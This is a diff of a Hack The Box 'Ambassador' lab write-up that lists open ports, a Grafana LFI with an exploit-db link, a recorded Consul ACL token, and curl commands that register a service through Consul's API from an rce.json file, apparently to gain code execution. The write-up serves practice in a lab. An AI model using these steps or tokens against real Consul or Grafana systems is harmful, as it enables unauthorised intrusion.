@@ -2,9 +2,9 @@ Hack the box Ambassador
 
 Initial Scan
 
-PORT 80 running a hugo site which a static site generater framework
-PORT 3000 running Grafana. A grafical monitering tool
-PORT 3306 running mysql
+PORT 80 running a hugo site which a static site generater framework   
+PORT 3000 running Grafana. A grafical monitering tool   
+PORT 3306 running mysql   
 
 unauthenticated LFI vuln in grafana version 3.2.0   
 Referance [https://www.exploit-db.com/exploits/50581]( https://www.exploit-db.com/exploits/50581)   
@@ -44,10 +44,9 @@ ACL token:bb03b43b-1d81-d62b-24b5-39540ee469b5
 Making exploit
 
 Referance API doc
-[https://www.consul.io/api-docs/agent/service](https://www.consul.io/api-docs/agent/service)
 
-Referance about default port
-[https://stackoverflow.com/questions/30684262/different-ports-used-by-consul](https://stackoverflow.com/questions/30684262/different-ports-used-by-consul)
+[https://www.consul.io/api-docs/agent/service](https://www.consul.io/api-docs/agent/service)   
+Referance about default port [https://stackoverflow.com/questions/30684262/different-ports-used-by-consul](https://stackoverflow.com/questions/30684262/different-ports-used-by-consul)   
 ```bash
 curl http://127.0.0.1:8500/v1/agent/services -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5"
 curl -X PUT http://127.0.0.1:8500/v1/agent/services/register -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" --data @rce.json
